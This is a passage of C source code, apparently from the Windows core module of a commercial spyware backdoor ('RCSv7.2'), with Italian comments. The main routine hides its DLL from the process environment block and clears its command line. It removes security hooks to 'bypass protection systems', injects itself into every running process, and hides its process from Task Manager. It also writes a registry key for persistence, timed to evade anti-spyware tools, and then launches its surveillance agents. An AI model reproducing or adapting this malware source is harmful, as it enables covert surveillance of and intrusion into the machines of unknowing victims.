	conf_file_handle = FNC(CreateFileA)(conf_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
}

void UnlockConfFile()
{
	DWORD i;
	char conf_path[DLLNAMELEN];

	HM_CompletePath(H4_CONF_FILE, conf_path);

	if (conf_file_handle)
		CloseHandle(conf_file_handle);
	conf_file_handle = NULL;

	for(i=0; i<MAX_DELETE_TRY; i++) {
		if (FNC(SetFileAttributesA)(conf_path, FILE_ATTRIBUTE_NORMAL))
			break;
		Sleep(DELETE_SLEEP_TIME);
	}
}

void HM_CalcDateDelta(long long server_time, nanosec_time *delta)
{
	long long client_time;
	long long delta_l;
	
	_time64(&client_time);
	delta_l = server_time - client_time;

	// Trasforma i secondi in 100-nanosec
	delta_l *= 10000000;
	delta->lo_delay = (DWORD)(delta_l & 0xFFFFFFFF);
	delta->hi_delay = (DWORD)(delta_l >> 32);
}

// Main del core
void __stdcall HM_sMain(void)
{
	pid_hide_struct pid_hide;

	// Tutte le funzioni di logging sono attive solo
	// nella versione demo
	if (!CreateLogWindow())
		FNC(ExitProcess)(0);

	REPORT_STATUS_LOG("- Checking modules..............");
	//Riempie i campi relativi al nome del file immagine,
	//file di configurazione, directory di installazione
	//etc. Va fatta come PRIMA cosa.
	if (!HM_GuessNames()) {
		REPORT_STATUS_LOG("ERROR\r\n    30112 [Cannot locate RCS core module]\r\n"); 
		ReportExitProcess();
	}
	REPORT_STATUS_LOG("OK\r\n"); 

	// Locka il file di configurazione per prevenire cancellazioni "accidentali"
	LockConfFile();

	// Elimina il modulo dalla PEB
	// XXX da qui in poi non potro' piu' fare GetModuleHandle etc. di questo modulo
	HidePEB(GetModuleHandle(H4DLLNAME));

	// Cancella la command line
	HM_ClearCommand();

	REPORT_STATUS_LOG("- Activating hiding system......");

	// Toglie gli hook, prende i privilegi, etc.
	if (!doUnhook()) {
		REPORT_STATUS_LOG("ERROR\r\n    17240 [Unable to bypass protection systems]\r\n"); 
		ReportExitProcess();
	} 
	REPORT_STATUS_LOG("OK\r\n"); 

	// Inizializza la chiave di cifratura (va fatto prima di qualsiasi
	// accesso al file di configurazione).
	LOG_InitCryptKey(bin_patched_key, bin_patched_key_conf);

	// Controlla se c'e' un file di configurazione pendente
	// o corrotto (lo rimpiazza con l'eventuale copia di backup).
	// Va fatto prima di AM_Startup, perche' quest'ultima legge
	// gia' il file di configurazione.
	HM_CheckNewConf();

	// Legge le configurazioni globali. Va fatto DOPO HM_CheckNewConf.
	HM_UpdateGlobalConf();
	
	// L'agent manager deve essere startato prima di effettuare gli hook 
	// (infatti e' lui che inizializza tutta la parte di IPC).
	REPORT_STATUS_LOG("- Initializing agents...........");
	if (!AM_Startup()) {
		REPORT_STATUS_LOG("ERROR\r\n    29310 [The system is already infected]\r\n"); 
		ReportExitProcess(); // AM_Startup fallisce se la sharedmemory gia' esiste
	}
	REPORT_STATUS_LOG("OK\r\n"); 

	// Effettua l'injection in tutti i processi attivi
	HM_HookActiveProcesses();

	// Lancia (se e' il caso) il core a 64 bit
	Run64Core();

	// Nasconde il processo chiamante (host della DLL core)
	SET_PID_HIDE_STRUCT(pid_hide, FNC(GetCurrentProcessId)());
	AM_AddHide(HIDE_PID, &pid_hide);

	// Inserisce la chiave nel registry
	// Viene fatto dopo l'hiding per evitare che venga vista da processi
	// come TeaTimer, ma fare attenzione che il processo core non possa 
	// uscire prima per altri errori (anche se c'e' qualche problema
	// la chiave nel registry deve essere inserita ad ogni costo).
	REPORT_STATUS_LOG("- Starting core module..........");
	Sleep(3300); // XXX Aspetta che venga fatta l'injection prima di scrivere la chiave
	HM_InsertRegistryKey(H4DLLNAME, FALSE);

	// Inizializza (dal file di configurazione) e fa partire gli agent
	// e il thread di dispatch
	AM_SuspendRestart(AM_RESET);
	REPORT_STATUS_LOG("OK\r\n"); 

	// Viene cambiato lo sfondo del desktop, ma solo se e'
	// stata compilata in versione DEMO
	SetDesktopBackground();

	// Fa partire il sync manager 
	SM_StartMonitorEvents();

	REPORT_STATUS_LOG("\r\n RCSv7.2 fully operational\r\n\r\n");
	SendStatusLog(L"[Core Module]: Backdoor started");

	// Ciclo per l'hiding da task manager e dai nuovi epxlorer
	// lanciati. Monitora anche la coda dei messaggi per
	// chiudere correttamente il processo al logoff.
	// E' nel thread principale per poter chiudere correttamente
	// il processo.
	HM_StartPolling();
}